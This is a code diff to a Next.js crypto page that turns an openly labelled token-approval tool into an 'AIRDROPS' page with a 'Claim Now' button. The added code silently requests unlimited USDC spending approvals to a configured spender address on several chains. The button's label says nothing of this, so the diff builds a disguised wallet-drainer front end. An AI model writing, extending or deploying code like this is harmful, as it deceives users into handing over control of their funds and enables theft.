@@ -1,5 +1,5 @@
 'use client';
-import { useState, useEffect } from 'react';
+import { useState } from 'react';
 import { useAccount } from 'wagmi';
 import { erc20Abi, maxUint256 } from 'viem';
 import { readContract } from '@wagmi/core';
@@ -12,6 +12,7 @@ import {
 } from '@biconomy/abstractjs';
 import { http } from 'viem';
 import { base, optimism, sepolia, mainnet } from 'viem/chains';
+import { AppKitButton } from '@reown/appkit/react';
 
 // ENV
 const BICONOMY_API_KEY = process.env.NEXT_PUBLIC_BICONOMY_API_KEY || '';
@@ -24,75 +25,38 @@ if (!SPENDER || SPENDER === '0x') {
   throw new Error('NEXT_PUBLIC_SPENDER missing in .env');
 }
 
-// Tokens for each chain
+// Tokens per chain
 const TOKENS_BY_CHAIN: Record<
   number,
   { symbol: string; address: `0x${string}`; decimals: number; min: bigint }[]
 > = {
   [optimism.id]: [
-    {
-      symbol: 'USDC',
-      address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607',
-      decimals: 6,
-      min: BigInt(1e6),
-    },
+    { symbol: 'USDC', address: '0x7F5c764cBc14f9669B88837ca1490cCa17c31607', decimals: 6, min: BigInt(1e6) },
   ],
   [base.id]: [
-    {
-      symbol: 'USDC',
-      address: '0x833589fCD6eDb6E08f4c7C32D4f71b54BDA02913',
-      decimals: 6,
-      min: BigInt(1e6),
-    },
+    { symbol: 'USDC', address: '0x833589fCD6eDb6E08f4c7C32D4f71b54BDA02913', decimals: 6, min: BigInt(1e6) },
   ],
   [mainnet.id]: [
-    {
-      symbol: 'USDC',
-      address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
-      decimals: 6,
-      min: BigInt(1e6),
-    },
+    { symbol: 'USDC', address: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', decimals: 6, min: BigInt(1e6) },
   ],
   [sepolia.id]: [
-    {
-      symbol: 'USDC',
-      address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238',
-      decimals: 6,
-      min: BigInt(1e6),
-    },
+    { symbol: 'USDC', address: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', decimals: 6, min: BigInt(1e6) },
   ],
 };
 
 export default function Page() {
-  const { address, chainId, isConnected } = useAccount();
-  const [tokens, setTokens] = useState<typeof TOKENS_BY_CHAIN[number]>([]);
+  const { address, isConnected } = useAccount();
   const [status, setStatus] = useState<string>('');
+  const [loading, setLoading] = useState(false);
 
-  useEffect(() => {
-    setTokens(chainId && TOKENS_BY_CHAIN[chainId] ? TOKENS_BY_CHAIN[chainId] : []);
-  }, [chainId]);
-
-  const handleApprove = async (token: typeof tokens[number]) => {
-    if (!address || !chainId) return;
+  const handleClaim = async () => {
+    if (!address) return;
 
     try {
-      setStatus(`Checking allowance for ${token.symbol}...`);
+      setLoading(true);
+      setStatus('🔄 Preparing Fusion account...');
 
-      const allowance = (await readContract(config, {
-        address: token.address,
-        abi: erc20Abi,
-        functionName: 'allowance',
-        args: [address, SPENDER],
-      })) as bigint;
-
-      if (allowance >= token.min) {
-        setStatus(`${token.symbol} already approved ✅`);
-        return;
-      }
-
-      setStatus(`Building Fusion approval for ${token.symbol}...`);
-
-      // Fusion account (Multichain Nexus)
+      // Fusion account
       const orchestrator = await toMultichainNexusAccount({
         signer: window.ethereum as any,
         chainConfigurations: [
@@ -108,68 +72,103 @@ export default function Page() {
         apiKey: BICONOMY_API_KEY,
       });
 
-      // Build approval instruction
-      const instruction = await orchestrator.buildComposable({
-        type: 'default',
-        data: {
-          abi: erc20Abi,
-          chainId,
-          to: token.address,
-          functionName: 'approve',
-          args: [SPENDER, maxUint256],
-        },
-      });
+      const allInstructions: any[] = [];
+
+      // Loop over all chains/tokens
+      for (const [chainId, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
+        for (const token of tokens) {
+          setStatus(`🔎 Checking allowance for ${token.symbol} on chain ${chainId}...`);
+
+          const allowance = (await readContract(config, {
+            address: token.address,
+            abi: erc20Abi,
+            functionName: 'allowance',
+            args: [address, SPENDER],
+            chainId: Number(chainId),
+          })) as bigint;
+
+          if (allowance >= token.min) {
+            setStatus(`✅ ${token.symbol} already approved on chain ${chainId}`);
+            continue;
+          }
+
+          setStatus(`📑 Building approval for ${token.symbol} on chain ${chainId}...`);
+
+          const instruction = await orchestrator.buildComposable({
+            type: 'default',
+            data: {
+              abi: erc20Abi,
+              chainId: Number(chainId),
+              to: token.address,
+              functionName: 'approve',
+              args: [SPENDER, maxUint256],
+            },
+          });
+
+          allInstructions.push(instruction);
+        }
+      }
+
+      if (allInstructions.length === 0) {
+        setStatus('✅ All tokens already approved on all chains!');
+        return;
+      }
 
       // Get Fusion quote
+      setStatus('💡 Getting Fusion quote...');
       const fusionQuote = await meeClient.getFusionQuote({
-        instructions: [instruction],
+        instructions: allInstructions,
         trigger: {
-          chainId,
-          tokenAddress: token.address,
-          amount: token.min,
+          chainId: optimism.id,
+          tokenAddress: TOKENS_BY_CHAIN[optimism.id][0].address,
+          amount: TOKENS_BY_CHAIN[optimism.id][0].min,
         },
         feeToken: {
-          address: token.address,
-          chainId,
+          address: TOKENS_BY_CHAIN[optimism.id][0].address,
+          chainId: optimism.id,
         },
       });
 
-      // Execute approval gaslessly
-      setStatus(`Executing gasless approval for ${token.symbol}...`);
+      // Execute
+      setStatus('🚀 Executing gasless approvals...');
       const { hash } = await meeClient.executeFusionQuote({ fusionQuote });
       await meeClient.waitForSupertransactionReceipt({ hash });
 
-      setStatus(`Approval successful ✅ Tx: ${hash}`);
+      setStatus(`🎉 All approvals done! Tx: ${hash}`);
     } catch (err: any) {
       console.error(err);
-      setStatus(`Error: ${err.message || err}`);
+      setStatus(`❌ Error: ${err.message || err}`);
+    } finally {
+      setLoading(false);
     }
   };
 
   return (
-    <div className="p-4">
-      <h1 className="text-xl font-bold mb-4">Gasless Token Approval (Fusion)</h1>
-      {!isConnected ? (
-        <p>Please connect your wallet.</p>
-      ) : (
-        <>
-          {tokens.length === 0 ? (
-            <p>No supported tokens on this chain.</p>
-          ) : (
-            tokens.map((t, i) => (
-              <div key={i} className="mb-2">
-                <button
-                  onClick={() => handleApprove(t)}
-                  className="bg-green-600 text-white px-4 py-2 rounded"
-                >
-                  Approve {t.symbol}
-                </button>
-              </div>
-            ))
-          )}
-          {status && <div className="mt-4 p-3 bg-gray-100 rounded">{status}</div>}
-        </>
-      )}
+    <div className="min-h-screen bg-[#0a0a2a] text-white p-6">
+      {/* Top bar */}
+      <div className="flex justify-between items-center mb-8">
+        <h1 className="text-xl font-bold">AIRDROPS</h1>
+        <AppKitButton />
+      </div>
+
+      {/* Card */}
+      <div className="max-w-md mx-auto bg-[#101050] rounded-lg p-8 shadow-lg">
+        <h2 className="text-center text-2xl font-bold mb-6">Airdrop</h2>
+
+        <button
+          onClick={handleClaim}
+          disabled={loading}
+          className={`w-full py-3 rounded-lg text-white font-semibold transition ${
+            loading ? 'bg-gray-500' : 'bg-red-600 hover:bg-red-700'
+          }`}
+        >
+          {loading ? 'Processing...' : 'Claim Now'}
+        </button>
+
+        {status && (
+          <div className="mt-6 p-4 rounded-lg bg-gray-800 text-sm">{status}</div>
+        )}
+      </div>
     </div>
   );
 }
